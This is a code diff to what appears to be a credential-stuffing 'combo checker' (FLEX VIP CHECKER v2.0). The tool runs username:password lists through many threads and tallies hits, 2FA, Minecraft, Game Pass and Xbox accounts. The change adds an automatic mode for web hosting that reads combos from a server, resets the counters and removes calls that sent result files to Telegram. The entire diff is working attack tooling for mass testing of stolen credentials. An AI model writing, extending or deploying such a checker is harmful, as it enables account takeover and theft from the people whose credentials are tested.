@@ -753,21 +753,21 @@ def check_account(combo):
         with stats._lock: stats.errors += 1; stats.checked += 1
 
 # ══════════════════════════════════════════════
-# START CHECKING
-def start_checking():
-    global bot
+# Combos (سيتم تعبئتها من server.py)
+Combos = []
 
-    combo_file = input(f"{Fore.CYAN}  Enter combo file path   : {Style.RESET_ALL}").strip()
-    print()
-
-    if not os.path.exists(combo_file):
-        print(f"{Fore.RED}  ✗ File not found: {combo_file}{Style.RESET_ALL}")
+# ══════════════════════════════════════════════
+# START CHECKING (AUTO MODE FOR WEB)
+# ══════════════════════════════════════════════
+def start_checking_auto():
+    """نسخة تعمل تلقائياً بدون طلب مدخلات (لـ Render)"""
+    global bot, Combos
+    
+    if not Combos:
+        print(f"{Fore.RED}  ✗ No combos loaded!{Style.RESET_ALL}")
         return
-
-    with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
-        combos = [line.strip() for line in f if line.strip() and ':' in line]
-
-    total = len(combos)
+    
+    total = len(Combos)
     if total == 0:
         print(f"{Fore.RED}  ✗ No valid combos found!{Style.RESET_ALL}")
         return
@@ -778,13 +778,19 @@ def start_checking():
     print(f"{Fore.CYAN}  ✓ Threads : {THREAD_COUNT}{Style.RESET_ALL}")
     print(f"{Fore.CYAN}  ✓ Results → ./Results/{Style.RESET_ALL}\n")
 
-    print(f"{Fore.YELLOW}  → Sending welcome video to Telegram...{Style.RESET_ALL}")
-    if tg_send_welcome():
-        print(f"{Fore.GREEN}  ✓ Welcome video sent!{Style.RESET_ALL}\n")
-    else:
-        print(f"{Fore.YELLOW}  ⚠ Could not send video{Style.RESET_ALL}\n")
-
-    input(f"{Fore.GREEN}  Press ENTER to start checking...{Style.RESET_ALL}")
+    # إعادة ضبط الإحصائيات
+    with stats._lock:
+        stats.checked = 0
+        stats.hits = 0
+        stats.bad = 0
+        stats.twofa = 0
+        stats.errors = 0
+        stats.minecraft = 0
+        stats.gamepass = 0
+        stats.xbox = 0
+        stats.not_linked = 0
+        stats.retries = 0
+        stats.start_time = time.time()
 
     stop_event = threading.Event()
     def display_loop():
@@ -796,7 +802,7 @@ def start_checking():
     disp.start()
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
-        futures = {executor.submit(check_account, c): c for c in combos}
+        futures = {executor.submit(check_account, c): c for c in Combos}
         for f in concurrent.futures.as_completed(futures):
             pass
 
@@ -806,15 +812,9 @@ def start_checking():
     print_table(total)
     print(f"\n{Fore.GREEN}  ✓ Checking complete!{Style.RESET_ALL}\n")
 
-    print(f"{Fore.YELLOW}  → Sending final stats...{Style.RESET_ALL}")
-    tg_send_final()
-
-    print(f"{Fore.YELLOW}  → Sending result files...{Style.RESET_ALL}")
-    tg_send_files()
-    print(f"{Fore.GREEN}  ✓ Done! Check your Telegram.{Style.RESET_ALL}\n")
-
 # ══════════════════════════════════════════════
-# MAIN
+# MAIN (للتشغيل المحلي فقط)
+# ══════════════════════════════════════════════
 def main():
     valid, user_id, expiry = check_license()
     if not valid:
@@ -829,7 +829,7 @@ def main():
         choice = input(f"└──╼ {Fore.LIGHTWHITE_EX}").strip()
         
         if choice == "1":
-            start_checking()
+            start_checking_auto()
             input(f"\n{Fore.LIGHTYELLOW_EX}Press ENTER to return to menu...")
         elif choice == "2":
             print(f"\n{Fore.LIGHTCYAN_EX}📖 FLEX VIP CHECKER v2.0")
